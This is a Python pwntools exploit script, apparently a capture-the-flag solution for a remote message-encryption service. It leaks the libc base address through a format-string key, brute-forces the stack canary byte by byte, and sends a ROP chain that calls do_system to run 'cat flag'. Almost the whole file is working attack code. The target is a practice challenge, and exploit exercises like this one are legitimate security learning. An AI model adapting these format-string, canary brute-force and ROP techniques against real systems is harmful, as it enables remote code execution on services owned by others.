#!/bin/env python3

from pwn import *

#
# INIT
#
libc = ELF(os.path.join(os.path.dirname(__file__), "glibc/libc.so.6"), False)

#
# UTILS
#
KEY = b"%9$p%7$n"
# GADGETS
MOV_RDI_RSP0X10_CALL_RBX = 0x00043817   # mov rdi, [rsp+0x10]; mov rdx, rbp; mov rsi, r12; call rbx;
POP_RBX = 0x001bbbc3                    # pop rbx; ret;

#
# FUNCTIONS
#
def encrypt(msg):
    cip_msg = b""
    for i in range(len(msg)):
        cip_msg += (msg[i] ^ KEY[i % len(KEY)]).to_bytes(1, "little")
    return cip_msg

def add_msg(msg):
    assert type(io) == process or type(io) == remote
    msg = encrypt(msg)
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"size: ", str(len(msg)).encode())
    io.sendafter(b"message: ", msg)
    io.recvuntil(b"PID: ")
    return int(io.recvline().strip())

def get_msg(pid):
    assert type(io) == process or type(io) == remote
    while True:
        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"PID: ", str(pid).encode())
        test = io.recv(1)
        if test == b"P":
            sleep(0.01)
            continue
        io.recvuntil(b": ")
        status = int(io.recvline().strip())
        # io.recvline()
        io.recvuntil(b"text:\n")
        ct = io.recvline().strip()
        break
    return status, ct


#
# EXPLOIT
#
def main(HOST, PORT):
    global io
    io = remote(HOST, PORT)

    POW_BYPASS = 'redacted'

    io.sendlineafter(b"Result:", f"99:{POW_BYPASS}".encode())

    io.sendafter(b"key: ", KEY)
    io.sendlineafter(b"blocks: ", b"8")
    io.recvline()
    libc.address = int(io.recvline().strip(), 16) - 0x29d90
    success(f"libc base: {hex(libc.address)}")

    # Bruteforce the stack canary
    canary = b"\x00"
    while len(canary) < 8:
        pids = []
        for i in range(256):
            payload = b"A" * (8 * 9)
            payload += canary + p8(i)
            pids.append((i, add_msg(payload)))
        for i, pid in pids:
            status, _ = get_msg(pid)
            if status == 0:
                canary += p8(i)

    canary = u64(canary.ljust(8, b"\x00"))
    success(f"canary: {hex(canary)}")

    # Send ROP chain
    payload = b"cat flag\x00"
    payload = encrypt(payload)
    payload = payload.ljust(8 * 9, b"\x00")
    payload += p64(canary)
    payload += b"B" * 8
    payload += p64(libc.address + POP_RBX)
    payload += p64(libc.sym.do_system)
    payload += p64(libc.address + MOV_RDI_RSP0X10_CALL_RBX)
    pid = add_msg(payload)
    sleep(2)
    _, ciphertext = get_msg(pid)
    flag = ciphertext[len(payload):]
    return flag.decode()


if __name__ == "__main__":
    print("This is not the main file.")
    sys.exit(0)
